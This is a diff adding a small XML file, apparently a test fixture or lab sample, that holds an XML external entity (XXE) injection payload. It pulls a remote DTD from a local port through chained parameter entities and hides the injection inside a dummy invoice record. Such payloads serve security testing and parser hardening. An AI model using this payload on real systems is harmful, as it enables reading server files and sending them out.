@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE boo [
+        <!DOCTYPE convert [ <!ENTITY % remote SYSTEM
+        "http://127.0.0.1:8091/file.dtd">%remote;%int;%trick;]>
+        blah
+        mypass
+<bill>
+    <product id="26">
+        <name>ok</name>
+        <quantity>0</quantity>
+        <price>0</price>
+    </product>
+</bill>
